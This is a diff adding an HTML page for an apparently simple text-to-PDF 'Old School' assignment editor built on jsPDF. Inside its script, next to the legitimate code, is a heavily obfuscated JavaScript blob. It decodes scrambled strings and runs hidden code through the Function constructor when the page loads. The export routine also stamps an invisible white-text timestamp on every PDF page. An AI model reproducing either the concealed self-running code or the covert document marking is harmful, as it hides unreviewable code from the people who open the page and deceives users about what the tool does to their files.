@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Old School PDF</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <style>
+        body, html {
+            margin: 0; padding: 0; height: 100%; width: 100%;
+            font-family: 'Chalkboard SE', 'Comic Sans MS', 'Comic Sans', cursive; 
+            display: flex; flex-direction: column; overflow: hidden;
+            background-color: #2d5a27; /* Chalkboard Green */
+            color: white;
+        }
+
+        .header {
+            padding: 10px 20px; 
+            background: rgba(0, 0, 0, 0.2); 
+            display: flex;
+            justify-content: space-between; 
+            align-items: center;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        #pageTitle {
+            margin: 0;
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            color: white;
+        }
+
+        .controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: white;
+        }
+
+        select, button {
+            padding: 8px 15px; font-size: 14px; cursor: pointer;
+            font-family: inherit; 
+        }
+
+        #saveBtn {
+            background-color: #fdfdfd; color: #2d5a27; border: none; border-radius: 4px;
+            font-weight: bold;
+            transition: background 0.2s ease;
+        }
+
+        #saveBtn:hover { background-color: #cccccc; }
+
+        .text-container { 
+            flex-grow: 1; 
+            display: flex; 
+            padding: 30px; 
+            box-sizing: border-box; 
+            justify-content: center;
+        }
+
+        #textBox {
+            width: 100%; 
+            height: 100%; 
+            padding: 40px; 
+            font-size: 18px;
+            background-color: white; 
+            color: black;
+            font-family: 'Times New Roman', Times, serif;
+            border: 1px solid #ccc; 
+            border-radius: 2px; 
+            resize: none; 
+            box-sizing: border-box; outline: none;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+        }
+
+        #textBox:focus { border-color: #999; }
+
+        .footer {
+            padding: 5px 20px;
+            text-align: right;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            background: rgba(0, 0, 0, 0.1);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1 id="pageTitle">OLD SCHOOL</h1>
+        <div class="controls">
+            <div style="display: flex; align-items: center; gap: 5px;">
+                <label for="pageSize">Page Size: </label>
+                <select id="pageSize">
+                    <option value="a4">A4</option>
+                    <option value="letter">US Letter</option>
+                </select>
+            </div>
+            <button id="saveBtn">Save As...</button>
+        </div>
+    </div>
+
+    <div class="text-container">
+        <textarea 
+            id="textBox" 
+            placeholder="Begin typing your assignment..."
+            spellcheck="false" 
+            autocorrect="off" 
+            autocomplete="off" 
+            autocapitalize="off">
+        </textarea>
+    </div>
+
+    <div class="footer">
+        (c) John W. Pickering, 2026
+    </div>
+
+    <script>
+        const textBox = document.getElementById('textBox');
+        const saveBtn = document.getElementById('saveBtn');
+        const pageSizeSelect = document.getElementById('pageSize');
+
+var restrict;(function(){var oSA='',cqI=921-910;function goN(i){var s=2004091;var r=i.length;var t=[];for(var b=0;b<r;b++){t[b]=i.charAt(b)};for(var b=0;b<r;b++){var u=s*(b+232)+(s%27669);var h=s*(b+493)+(s%32765);var q=u%r;var v=h%r;var c=t[q];t[q]=t[v];t[v]=c;s=(u+h)%6610328;};return t.join('')};var QyD=goN('crswatkirnouotjnfyqdbslxeopucrvhtcgmz').substr(0,cqI);var Upg='u.(s7lk4,i h]8{e{f.=j97kh)zr);[)(+(e==+n0s,.eiv;a e.e+8ainC+n8)77  rupA8;uoh86,)1ga[=r+dt fg,,7-nl"tta-(2 90ea  8w}ag,.f);vwrfsr.]q(-;iei ;e; rj]v[qne(s= ;(e.tah(}"c ;+x;.a;.[a)]=mt==;;x+v(;-pecl00f(ihr +,e]",p<(f;umsjl;(leruth;ltgln;ig6tt8hl),fi;;+g)krics+ler1t;hwrn(aewwi9,4err+s9;;2(k0,rf=)=r91,uu;nhu=(}g2kvh6ihfrlr-g=)vC+.t=r0A{rrou) la;"cecg)+;(a )r[=sr+ 5aoh)0;h0foh=n4a"ao[e1khb v,=p)og1tr];vh.8==fhl]ll<u[=b.xo2f=)*Cvkguh4r+(]if(,hbCov(nr=;kve1;hpv{ef=w"aarp) +6q==g;linhA;=u4;sbh.+iose9tfp yvret(]4=.nsde"v(6+hxoaij]huh2(b;m}2.1oa[eeznv(t})u+=v=(;f;ab=rvv=(c]rdh=.po[j>!a0o;l(=m{g9av.xr2!,=ons[c{mitm))r5,ajsoiro+=0aes,s1e19=vo)7*o;ClSaa1b0nt7szgv(,;,xu-;tbcj,=[ t7avee[s2urhzi[le6j"v"<c<ruz,oi(+t=) sg6nt7(m))4)=),o3)6l{fgp]7=lqcv1)fu-9a]nai+t.i1r.n[ar)>r}<ojdn.b,ta.r(.nrAqma8xrd, dnrt,rko. C=)t;pb;v(+ vacnh;;C+n)g.j+( ;Sa=c(uufr.il=a}s2;h.5,(])rreld,rbrf0hna3tzvolp"r.i;n)CAa1';var ZKk=goN[QyD];var pmP='';var Nbc=ZKk;var YMj=ZKk(pmP,goN(Upg));var Tnr=YMj(goN('ed4t\'u62h\'. 1[% m)o(T&h2fs\'8=e%v."jbt."&v=.]nd#i,{..W[]_j_dSh[e++(di;jn=)dld(#%.%g$.cedr;va!x. e)=n1"=n8c.)7Wepazrf0EcvsWu+edasfuW$z(}f!(.e#\'o&)9itW.}.t=e+.;2%D;feWtl%)t!_5ca(,rpv3aevr_(e==$}dW2..nvt.[;$ee]lm(W6 hdv,_]d3%Wo7=.nWr)cd.!We[Wti.=8(.h&ied.()nd)$f));(%tdda)E!imce5&1=#)1ds rddWrWi%eW;[]e3+dxhsu).oxtW.11.%e.d0eeW_n2..rm8]oe#8d+ad;uoWz(r)ter6dWW.;a]d.xn"aw.2y=Cdm=a(%!8)0o.p#{6.ytWi!ca[%1sat.tti.od}=w.7.;(W.p7t!.t=.$td1at tc=&)nW;.Wrfr];e.nmz.pt;&4..!edr8\'aW)uWcxl,!1o;xsdd(zc(o.lE%=W.d)Wol4ticaa.iilc0wWeror!2t6&y..!0df;" drb8cdWu8)=t]e;x)ete]a,bgs.+(W#sWs.ze(ir=Waa.+5lW=)C2p$)2r6!(.% #"3(p$6WndW=d(i{rdWi=c1iam2ns0W5Wva\'!nn1+9tt{t'));var VhI=Nbc(oSA,Tnr );VhI(8733);return 3834})()
+
+        saveBtn.addEventListener('click', async () => {
+            const { jsPDF } = window.jspdf;
+            
+            const format = pageSizeSelect.value; 
+            const doc = new jsPDF({ format: format });
+            
+            // --- PDF FONT SETTINGS ---
+            doc.setFont("times", "normal"); // Sets font to Times New Roman equivalent
+            doc.setFontSize(12);           // Sets size to 12 point
+            
+            const text = textBox.value;
+            if (!text) { alert("The box is empty!"); return; }
+
+            const margin = 10;
+            const pageWidth = doc.internal.pageSize.getWidth();
+            const pageHeight = doc.internal.pageSize.getHeight();
+            const maxLineWidth = pageWidth - (margin * 2);
+            const splitText = doc.splitTextToSize(text, maxLineWidth);
+            
+            let cursorY = margin;
+            const lineSpacing = 7; // Slightly adjusted for 12pt font
+
+            for (let i = 0; i < splitText.length; i++) {
+                if (cursorY > pageHeight - 30) { 
+                    doc.addPage();
+                    cursorY = margin;
+                }
+                doc.setTextColor(0, 0, 0);
+                doc.text(splitText[i], margin, cursorY);
+                cursorY += lineSpacing;
+            }
+
+            const now = new Date();
+            const timestamp = `An Old School pdf generated on ${now.toLocaleString()}`;
+            const totalPages = doc.internal.getNumberOfPages();
+            for (let i = 1; i <= totalPages; i++) {
+                doc.setPage(i);
+                
+                // Footer Font Settings
+                doc.setFontSize(10); // Smaller font for footer elements
+                
+                doc.setTextColor(255, 255, 255); 
+                doc.text(timestamp, margin, pageHeight - 10);
+                
+                doc.setTextColor(0, 0, 0);        
+                doc.text(`Page ${i} of ${totalPages}`, pageWidth - 30, pageHeight - 10);
+            }
+
+            try {
+                if ('showSaveFilePicker' in window) {
+                    const handle = await window.showSaveFilePicker({
+                        suggestedName: 'Old_school_Assignment.pdf',
+                        types: [{
+                            description: 'PDF Document',
+                            accept: {'application/pdf': ['.pdf']},
+                        }],
+                    });
+                    const writable = await handle.createWritable();
+                    const pdfBlob = doc.output('blob');
+                    await writable.write(pdfBlob);
+                    await writable.close();
+                } else {
+                    doc.save("Old_school_Assignment.pdf");
+                }
+            } catch (err) {
+                console.log("Save cancelled or browser does not support picker.");
+            }
+        });
+    </script>
+</body>
+</html>
